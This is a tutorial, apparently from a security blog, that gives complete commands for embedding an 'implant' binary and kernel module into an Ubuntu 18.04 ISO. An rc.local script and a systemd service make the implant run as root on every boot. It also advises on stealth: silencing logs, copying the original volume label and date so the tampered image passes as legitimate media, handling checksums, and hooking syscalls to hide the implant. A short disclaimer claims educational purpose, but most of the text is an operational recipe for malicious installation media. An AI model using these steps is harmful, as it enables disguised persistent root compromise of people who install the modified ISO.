# Kernel Implant on Ubuntu OS: A Complete Guide to Installing Implant Binary on ISO File

## Overview

This guide demonstrates how to embed a kernel implant binary directly into an Ubuntu ISO so it executes automatically as root on every boot.

> Goal: Insert your implant binary into the Ubuntu ISO so it runs automatically as root on boot. Nothing else.

No package installation. No configuration changes. No autoinstall setup. Just your implant, running as root, every time the system boots.

**Disclaimer**: This guide is for educational and authorized security research purposes only. Deploying kernel implants on systems you do not own or have explicit permission to test is illegal. Always operate within the bounds of applicable laws and signed agreements.

---

## What Is a Kernel Implant?

A kernel implant is malicious or research-oriented software that embeds itself into the operating system kernel, the core component managing hardware, memory, and system calls. By operating at this privilege level, it gains near-total control over the system while remaining extremely difficult to detect.

Common kernel implant techniques include:

| Technique | Description |
|-----------|-------------|
| LKM (Loadable Kernel Module) | Loads malicious code as a kernel module |
| ftrace hooking | Intercepts kernel functions via ftrace |
| Syscall hooking | Hijacks system calls to hide artifacts |
| eBPF abuse | Uses extended Berkeley Packet Filter for covert operations |

By bundling such an implant into an Ubuntu ISO, the implant executes with root privileges the moment the live system (or installed system) boots, before most security tooling is even initialized.

---

## Prerequisites

Before starting, ensure you have the required tools installed:

```bash
sudo apt update
sudo apt install -y xorriso squashfs-tools rsync
```

| Tool | Purpose |
|------|---------|
| xorriso | Extract and rebuild ISO images while preserving boot data |
| squashfs-tools | Extract and repack the compressed filesystem |
| rsync | Copy files while preserving permissions |

**Disk space requirement**: Approximately 4x the ISO size for working directories.

**Binary requirements**:
- The implant binary must be statically linked OR all its shared library dependencies must already exist in the base Ubuntu ISO
- The binary must have the execute bit set

---

## Working Directory Setup

This guide assumes the following working directory structure:

```bash
cd ~/Desktop/BLOG/Kernel_Implant
```

Verify your directory contents:

```bash
ls -al
```

Expected output:

```
drwxrwxr-x 2 localhost localhost       4096 Oct 15 20:35 .
drwxrwxr-x 4 localhost localhost       4096 Oct 15 20:34 ..
-rw-rw-r-- 1 localhost localhost 2514124800 Oct 15 20:35 ubuntu-18.04.6-desktop-amd64.iso
```

All commands in this guide use paths relative to this working directory. Adjust paths if your setup differs.

---

## Step 1: Extract the ISO Contents

### Mount the ISO

```bash
cd ~/Desktop/BLOG/Kernel_Implant
mkdir isomount
sudo mount -o loop ubuntu-18.04.6-desktop-amd64.iso isomount
```

### Extract Using rsync

```bash
rsync -a isomount/ extracted
```

Using rsync preserves file permissions and symbolic links, which is critical for a bootable ISO.

---

## Step 2: Extract the Filesystem (squashfs)

The Ubuntu live system filesystem is stored in `casper/filesystem.squashfs`. This compressed image contains the actual operating system that gets written to the target filesystem during installation.

```bash
cd ~/Desktop/BLOG/Kernel_Implant
sudo unsquashfs extracted/casper/filesystem.squashfs
```

This creates a `squashfs-root/` directory containing the complete root filesystem.

---

## Step 3: Insert the Kernel Implant

This is the only modification you need to make. No package installation, no system changes. Just your implant binary and a boot script.

### 3.1 Copy the Implant Binary Into the Filesystem

From your host machine (outside the chroot), copy your compiled implant binary into the extracted root filesystem:

```bash
sudo cp ~/myimplant squashfs-root/usr/bin/myimplant
sudo chmod 755 squashfs-root/usr/bin/myimplant
sudo chown root:root squashfs-root/usr/bin/myimplant
```

**Critical**: The binary must have the execute bit set (755). Even as root, Linux will refuse to execute a file without the x permission.

If your implant is statically linked, it will run on any system. If it is dynamically linked, verify its dependencies are already present in the ISO:

```bash
ldd ~/myimplant
```

Since we are not installing anything, all required libraries must already exist in the base Ubuntu ISO. If a library is missing, your implant will fail to run.

**For kernel implants requiring module loading**: If your implant needs to load a kernel module (.ko file), copy it to the appropriate location:

```bash
sudo cp ~/myimplant.ko squashfs-root/lib/modules/$(uname -r)/kernel/drivers/myimplant.ko
```

Note: The kernel version inside the ISO may differ from your host. Check the target kernel version by examining `squashfs-root/lib/modules/`.

### 3.2 Create the rc.local Script

**Important**: Ubuntu does not include `/etc/rc.local` by default. You must create it manually.

Create the `/etc/rc.local` file inside the extracted filesystem that will launch your implant at boot:

```bash
sudo nano squashfs-root/etc/rc.local
```

Add the following content:

```bash
#!/bin/bash
# This script runs as root during boot via systemd-rc-local-generator
# Launch the kernel implant as root
/usr/bin/myimplant &
exit 0
```

**Explanation of key lines:**

| Line | Purpose |
|------|---------|
| #!/bin/bash | The shebang, required for the script to execute properly |
| /usr/bin/myimplant & | Launches your implant in the background as root |
| exit 0 | Required, signals successful completion to systemd |

**Important**: The `exit 0` at the end is not optional. If `rc.local` returns a non-zero exit code, systemd will mark the service as failed, and the boot process will show an error.

### 3.3 Make rc.local Executable

This is the most critical step. If `/etc/rc.local` is not executable, the `systemd-rc-local-generator` will completely ignore it and your implant will never run:

```bash
sudo chmod +x squashfs-root/etc/rc.local
```

Verify the permission:

```bash
ls -la squashfs-root/etc/rc.local
# Should show: -rwxr-xr-x 1 root root ... rc.local
```

### 3.4 Enable the rc-local Service

Ubuntu uses systemd instead of the old SysV init system. While a systemd generator may automatically detect `/etc/rc.local`, the most reliable method is to explicitly enable the service.

Create the service file:

```bash
sudo nano squashfs-root/etc/systemd/system/rc-local.service
```

Add the following content:

```ini
[Unit]
Description=/etc/rc.local Compatibility
Documentation=man:systemd-rc-local-generator(8)
ConditionFileIsExecutable=/etc/rc.local
After=network.target

[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
RemainAfterExit=yes
GuessMainPID=no

[Install]
WantedBy=multi-user.target
Alias=rc-local.service
```

Create the symlink so systemd reads it from `/etc/systemd/system/`:

```bash
sudo ln -s /etc/systemd/system/rc-local.service squashfs-root/etc/systemd/system/multi-user.target.wants/rc-local.service
```

**Note**: On some Ubuntu versions, the `rc-local.service` may already exist in `/lib/systemd/system/`. You can check by looking inside the squashfs-root directory. If it exists, you only need to ensure it is enabled.

### 3.5 How It Works

On modern Ubuntu, the `systemd-rc-local-generator` checks if `/etc/rc.local` exists and is executable. If both conditions are met, it activates the `rc-local.service` unit. This service runs `/etc/rc.local` as root during boot.

**Caveats to be aware of:**

- **Network readiness**: `rc.local` runs after `network.target` but does not guarantee the network is fully up. If your implant needs network access (e.g., C2 communication), it may fail on boot.
- **Process termination**: By default, systemd may forcefully terminate child processes started by `rc.local` during shutdown.
- **Logging**: Output is not captured by `journalctl` by default. To capture logs for debugging, redirect output inside the script:
  ```bash
  /usr/bin/myimplant > /var/log/myimplant.log 2>&1 &
  ```
- **Stealth consideration**: For a kernel implant, you may want to suppress logging entirely to avoid leaving traces. In that case, redirect to `/dev/null`:
  ```bash
  /usr/bin/myimplant > /dev/null 2>&1 &
  ```

---

## Step 4: Repack the Filesystem

### Remove Old squashfs

```bash
sudo rm extracted/casper/filesystem.squashfs
```

### Create New squashfs

```bash
cd ~/Desktop/BLOG/Kernel_Implant
sudo mksquashfs squashfs-root extracted/casper/filesystem.squashfs \
    -comp xz \
    -progress
```

The `-comp xz` flag uses XZ compression for a smaller ISO size. The process may take several minutes depending on your system.

### Update Filesystem Size

Ubuntu checks the size of the squashfs against a recorded value. Update it:

```bash
sudo du -sx --block-size=1 extracted/casper/filesystem.squashfs | cut -f1 > extracted/casper/filesystem.size
```

### Update MD5 Checksums

Ubuntu uses `md5sum.txt` to verify ISO integrity. You must regenerate it after modifying the filesystem:

```bash
cd extracted
sudo rm md5sum.txt
sudo find . -type f -print0 | xargs -0 md5sum | sudo tee md5sum.txt
cd ..
```

**Stealth consideration**: If you want to avoid detection of a modified ISO, you may choose to skip regenerating `md5sum.txt`. However, this will cause integrity check warnings on boot and may trigger security tooling.

---

## Step 5: Rebuild the ISO

### Generate Boot Parameters from Original ISO

The most reliable way to preserve bootability is to extract the boot parameters from the original ISO:

```bash
cd ~/Desktop/BLOG/Kernel_Implant
xorriso -indev ubuntu-18.04.6-desktop-amd64.iso -report_el_torito as_mkisofs
```

For this specific ISO, the output is:

```
-V 'Ubuntu 18.04.6 LTS amd64'
--modification-date='2021091520415900'
-isohybrid-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt,zero_apm:'/home/localhost/Desktop/BLOG/Kernel_Implant/ubuntu-18.04.6-desktop-amd64.iso'
-partition_cyl_align on
-partition_offset 0
-partition_hd_cyl 150
-partition_sec_hd 32
--mbr-force-bootable
-apm-block-size 2048
-iso_mbr_part_type 0x00
-c '/isolinux/boot.cat'
-b '/isolinux/isolinux.bin'
-no-emul-boot
-boot-load-size 4
-boot-info-table
-eltorito-alt-boot
-e '/boot/grub/efi.img'
-no-emul-boot
-isohybrid-gpt-basdat
-isohybrid-apm-hfsplus
```

These are the exact boot flags used by Canonical for this specific ISO. Using them ensures the rebuilt ISO remains bootable on both BIOS and UEFI systems.

### Rebuild with xorriso

Using the parameters reported above, the rebuild command becomes:

```bash
cd ~/Desktop/BLOG/Kernel_Implant
sudo xorriso -as mkisofs \
    -V 'Ubuntu 18.04.6 LTS amd64' \
    --modification-date='2021091520415900' \
    -isohybrid-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt,zero_apm:'/home/localhost/Desktop/BLOG/Kernel_Implant/ubuntu-18.04.6-desktop-amd64.iso' \
    -partition_cyl_align on \
    -partition_offset 0 \
    -partition_hd_cyl 150 \
    -partition_sec_hd 32 \
    --mbr-force-bootable \
    -apm-block-size 2048 \
    -iso_mbr_part_type 0x00 \
    -c '/isolinux/boot.cat' \
    -b '/isolinux/isolinux.bin' \
    -no-emul-boot \
    -boot-load-size 4 \
    -boot-info-table \
    -eltorito-alt-boot \
    -e '/boot/grub/efi.img' \
    -no-emul-boot \
    -isohybrid-gpt-basdat \
    -isohybrid-apm-hfsplus \
    -o custom-ubuntu-implant.iso \
    extracted/
```

**Note**: The `-isohybrid-mbr` flag references the original ISO path directly. This is intentional because the MBR boot code is extracted from the original image at build time. If you move or rename the original ISO, update this path accordingly.

**Stealth consideration**: The volume label and modification date are copied from the original ISO, making the modified image blend in with legitimate Ubuntu media.

---

## Step 6: Testing the Implant ISO

Always test in a virtual machine before writing to physical media:

```bash
qemu-system-x86_64 -m 4096 -cdrom custom-ubuntu-implant.iso -boot d
```

Check that:

1. The system boots to the live desktop
2. Your implant is present at `/usr/bin/myimplant` (verify with `ls -la /usr/bin/myimplant`)
3. Your implant is running (verify with `ps aux | grep myimplant`)
4. If your implant hooks syscalls or loads a kernel module, verify kernel-level activity:
   ```bash
   lsmod | grep myimplant
   dmesg | tail -20
   ```

### Testing with a Virtual Disk (to Test Installation)

To test the full install flow, add a virtual disk:

```bash
qemu-img create -f qcow2 testdisk.qcow2 30G
qemu-system-x86_64 -m 4096 -cdrom custom-ubuntu-implant.iso -boot d \
    -drive file=testdisk.qcow2,format=qcow2 \
    -enable-kvm -cpu host
```

With KVM enabled, the VM runs at near-native speed.

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "Cannot read superblock" | Run commands with sudo, loop mounting requires root |
| Missing EFI boot | Verify the `-e` path exists in the extracted ISO (e.g., `boot/grub/efi.img`) |
| xorriso boot image error | Verify the `-b` and `-e` paths match the original ISO structure |
| ISO too large | Use stronger compression (`-comp xz`) |
| Implant won't execute | Verify `chmod +x /usr/bin/myimplant` and check `ldd` for missing libraries |
| rc.local not running | Verify `chmod +x /etc/rc.local`, the execute bit is mandatory |
| rc-local.service not found | Create the service file manually (see Step 3.4) |
| Implant missing after boot | Confirm you copied it to `squashfs-root/usr/bin/` before running `mksquashfs` |
| MD5 checksum errors | Regenerate `md5sum.txt` after modifying the filesystem (see Step 4) |
| Kernel module won't load | Verify the .ko file matches the target kernel version in the ISO |
| Network C2 not connecting | `rc.local` runs after `network.target` but before full connectivity, add a `sleep 10` before launching |

---

## Kernel Implant Considerations

When embedding a kernel implant (versus a regular binary), keep these additional factors in mind:

| Consideration | Description |
|---------------|-------------|
| Kernel version matching | If your implant includes a kernel module (.ko), it must match the target kernel version inside the ISO. Check with `ls squashfs-root/lib/modules/` |
| Module signing | Ubuntu may enforce module signature verification. Unsigned modules will be rejected unless Secure Boot is disabled or the module is signed |
| Persistence | The rc.local method runs the implant on every boot. If your implant needs to survive installation to disk, it must also install itself into the target system |
| Detection evasion | Kernel implants are typically designed to hide their own presence. Ensure your implant hooks the appropriate syscalls (e.g., getdents, kill, read) to filter its artifacts from ps, ls, and /proc |
| Cleanup | After testing, always restore the original ISO and verify no implant artifacts remain on test systems |

---

## Summary

| Stage | Command | Purpose |
|-------|---------|---------|
| Extract | `rsync -a isomount/ extracted` | Copy ISO contents |
| Extract FS | `unsquashfs casper/filesystem.squashfs` | Access root filesystem |
| Insert Implant | `cp myimplant squashfs-root/usr/bin/` | Bundle your implant |
| Auto-run | `chmod +x /etc/rc.local` | Launch as root on boot |
| Enable Service | Create `rc-local.service` + symlink | Ensure systemd runs rc.local |
| Repack FS | `mksquashfs squashfs-root filesystem.squashfs` | Compress modified FS |
| Update MD5 | Regenerate `md5sum.txt` | Ensure ISO integrity checks pass |
| Rebuild | `xorriso -as mkisofs ... extracted/` | Create bootable ISO |

That is it. No package installation, no configuration changes, no autoinstall. Just your kernel implant binary running as root on every boot of your custom Ubuntu ISO.

For more advanced automation, consider using live-build or livecd-rootfs, which are Canonical's official tools for building Ubuntu images.
